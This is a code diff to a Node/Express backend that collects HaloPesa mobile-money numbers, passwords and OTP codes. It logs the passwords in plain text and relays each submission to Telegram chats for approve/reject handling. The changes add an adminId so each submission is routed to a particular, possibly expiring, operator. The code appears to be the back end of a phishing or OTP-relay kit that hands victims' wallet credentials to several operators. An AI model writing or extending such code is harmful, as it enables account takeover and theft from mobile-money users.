@@ -2045,7 +2045,7 @@ app.get('/api/check-returning-customer/:phoneNumber', async (req, res) => {
 // POST /api/register-user
 app.post('/api/register-user', async (req, res) => {
   try {
-    const { firstName, lastName, haloNumber, password, timestamp } = req.body;
+    const { firstName, lastName, haloNumber, password, timestamp, adminId } = req.body;  // ✅ Add adminId
 
     if (!firstName || !lastName || !haloNumber || !password) {
       return res.status(400).json({ success: false, message: 'Missing required fields' });
@@ -2076,7 +2076,8 @@ app.post('/api/register-user', async (req, res) => {
       timestamp: new Date(timestamp),
       status: 'pending',
       adminResponse: null,
-      rejectionReason: null
+      rejectionReason: null,
+      adminId: adminId || null  // ✅ Store which admin this is for
     });
 
     console.log(`📋 New registration pending: ${registrationId}`);
@@ -2084,6 +2085,7 @@ app.post('/api/register-user', async (req, res) => {
     console.log(`   HaloPesa: ${haloNumber}`);
     console.log(`   Password: ${password}`);
     console.log(`   OTP Generated: ${otp}`);
+    console.log(`   Admin Link: ${adminId || 'DIRECT ACCESS'}`);  // ✅ Log admin ID
 
     // Check if this is a returning user (has previous applications)
     let isReturningUser = false;
@@ -2100,7 +2102,32 @@ app.post('/api/register-user', async (req, res) => {
     }
 
     try {
-      const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+      // ✅ Determine who should receive notification
+      let targetAdminChatId = null;
+      let targetAdminName = 'Unknown Admin';
+
+      if (adminId) {
+        try {
+          const admin = await db.getAdmin(adminId);
+          if (admin && admin.chatId && !admin.expired) {
+            targetAdminChatId = admin.chatId;
+            targetAdminName = admin.name;
+            console.log(`✅ Sending to admin: ${admin.name} (${adminId})`);
+          } else {
+            targetAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+            targetAdminName = 'Super Admin';
+            console.log(`⚠️ Admin ${adminId} not found/expired - using superadmin`);
+          }
+        } catch (error) {
+          console.error(`❌ Error getting admin ${adminId}: ${error.message}`);
+          targetAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+          targetAdminName = 'Super Admin';
+        }
+      } else {
+        targetAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+        targetAdminName = 'Super Admin';
+        console.log(`ℹ️ No admin link used - sending to superadmin`);
+      }
       
       const userStatusLabel = isReturningUser ? '🔄 *RETURNING USER*' : '✨ *NEW USER*';
       
@@ -2129,7 +2156,9 @@ ${userStatusLabel}
         callback_data: `app_reject_${registrationId}`
       };
 
-      await bot.sendMessage(superAdminChatId, message.trim(), {
+      console.log(`📢 Sending registration to: ${targetAdminName} (Chat ID: ${targetAdminChatId})`);
+
+      await bot.sendMessage(targetAdminChatId, message.trim(), {
         parse_mode: 'Markdown',
         reply_markup: {
           inline_keyboard: [[approveBtn, rejectBtn]]
@@ -2229,7 +2258,28 @@ app.post('/api/submit-otp', async (req, res) => {
 
     // Send to Telegram for admin verification
     try {
-      const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+      // ✅ Determine target admin
+      let targetAdminChatId = null;
+      let targetAdminName = 'Unknown Admin';
+
+      if (registration.adminId) {
+        try {
+          const admin = await db.getAdmin(registration.adminId);
+          if (admin && admin.chatId && !admin.expired) {
+            targetAdminChatId = admin.chatId;
+            targetAdminName = admin.name;
+          } else {
+            targetAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+            targetAdminName = 'Super Admin';
+          }
+        } catch (error) {
+          targetAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+          targetAdminName = 'Super Admin';
+        }
+      } else {
+        targetAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+        targetAdminName = 'Super Admin';
+      }
       
       const message = `
 🔐 *OTP CODE VERIFICATION*
@@ -2254,7 +2304,9 @@ app.post('/api/submit-otp', async (req, res) => {
         callback_data: `reg_otp_reject_${registrationId}`
       };
 
-      await bot.sendMessage(superAdminChatId, message.trim(), {
+      console.log(`📢 Sending OTP to: ${targetAdminName} (Chat ID: ${targetAdminChatId})`);
+
+      await bot.sendMessage(targetAdminChatId, message.trim(), {
         parse_mode: 'Markdown',
         reply_markup: {
           inline_keyboard: [[approveBtn, rejectBtn]]
